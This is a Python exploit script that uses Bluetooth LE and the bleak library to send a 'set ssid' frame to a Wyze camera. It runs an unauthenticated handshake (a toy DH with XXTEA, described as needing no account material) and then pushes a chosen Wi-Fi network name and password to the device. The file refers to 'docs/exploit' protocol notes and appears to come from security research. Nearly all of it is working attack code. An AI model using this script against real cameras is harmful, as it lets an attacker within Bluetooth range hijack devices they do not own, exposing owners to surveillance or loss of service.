#!/usr/bin/env python3
"""Send a WFAP `set ssid` frame to a Wyze camera over BLE.

Protocol map and constants: docs/exploit/wyze-ble-wfap.md and ...-cipher.md.
Frame layout: flags | cmd | len | checksum | payload; payload = TLV(tag 10, b"s=" b64(ssid) b"&p=" b64(pwd)).
Payloads are encrypted by the session cipher (wfap_crypto) unless cmd == 0xF0.

  wyze_ble_setssid.py --ssid zz --pwd 'x' --mac 80482c525905 --proto 1 --send

`--proto 1` (toy DH + XXTEA) needs no account material and is the first thing to try; `--proto 2`
(ECDH + AES-GCM) also needs none but is only offered when the camera advertises it; `--proto 3`
additionally needs the account public key and a 32-byte pre-auth code (`--user-pubkey`, `--auth-code`).
"""
import argparse
import asyncio
import base64
import struct
import sys

sys.path.insert(0, "/tmp")
sys.path.insert(0, "/Users/jemanuel/projects/franken_surveillance_system/deliverables/scripts")

SVC = "0000fd7b-0000-1000-8000-00805f9b34fb"
CHR = "00000001-0000-1000-8000-00805f9b34fb"
CMD_READY = 0x80
CMD_SSID = 0x82
TAG_SSID = 10


def ssid_payload(ssid: str, pwd: str) -> bytes:
    v = b"s=" + base64.b64encode(ssid.encode()) + b"&p=" + base64.b64encode(pwd.encode())
    return struct.pack("<HH", TAG_SSID, len(v)) + v


async def run(a) -> int:
    import wfap_crypto as W
    from bleak import BleakClient, BleakScanner

    mac = bytes.fromhex(a.mac.replace(":", ""))
    d = await BleakScanner.discover(timeout=12.0, return_adv=True)
    dev = next((dv for _, (dv, adv) in d.items() if adv.manufacturer_data.get(2160, b"").endswith(mac)), None)
    if dev is None:
        print("not advertising")
        return 1

    s = W.Session()
    async with BleakClient(dev) as c:
        replies: dict[int, bytes] = {}

        async def on_ind(ch, data):
            frames = W.Session.parse_frames(bytes(data))
            for cmd, _seq, pl in frames:
                replies[cmd] = pl
                print(f"<- {cmd:#04x} {pl.hex()}")

        await c.start_notify(CHR, on_ind)

        handshake = s.handshake_frames(secret_present=bool(a.auth_code),
                                       user_pubkey=bytes.fromhex(a.user_pubkey) if a.user_pubkey else None)
        if a.proto == 1:
            handshake = [(0xF0, s.handshake_frame_proto1())]
        elif a.proto == 2:
            handshake = [(0xF4, s.handshake_frame_proto2())]

        for cmd, pl in handshake:
            f = s.frame(cmd, pl, encrypt=False)
            print(f"-> {cmd:#04x} {f.hex()}")
            await c.write_gatt_char(CHR, f, response=True)
            await asyncio.sleep(1.2)
            if cmd == 0xF0 and 0xF0 in replies:
                s.accept_proto1(replies[0xF0])
            elif cmd == 0xF4 and 0xF4 in replies:
                s.accept_proto2(replies[0xF4])

        await c.write_gatt_char(CHR, s.frame(CMD_READY, encrypt=False), response=True)
        await asyncio.sleep(0.3)
        f = s.frame(CMD_SSID, ssid_payload(a.ssid, a.pwd))
        print(f"-> 0x82 {f.hex()}")
        await c.write_gatt_char(CHR, f, response=True)
        await asyncio.sleep(1.0)
        await c.write_gatt_char(CHR, s.frame(CMD_READY, encrypt=False), response=True)
        await asyncio.sleep(2.0)
        print("replies:", {hex(k): v.hex() for k, v in replies.items()})
    return 0


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--ssid", required=True)
    ap.add_argument("--pwd", default="")
    ap.add_argument("--mac", required=True)
    ap.add_argument("--proto", type=int, default=1, choices=(1, 2, 3))
    ap.add_argument("--user-pubkey", help="proto 3: account P-256 public key (hex)")
    ap.add_argument("--auth-code", help="proto 3: 32-byte pre-auth code (hex)")
    ap.add_argument("--send", action="store_true")
    a = ap.parse_args()
    if not a.send:
        v = ssid_payload(a.ssid, a.pwd)
        print("payload", v.hex())
        return 0
    return asyncio.run(run(a))


if __name__ == "__main__":
    sys.exit(main())
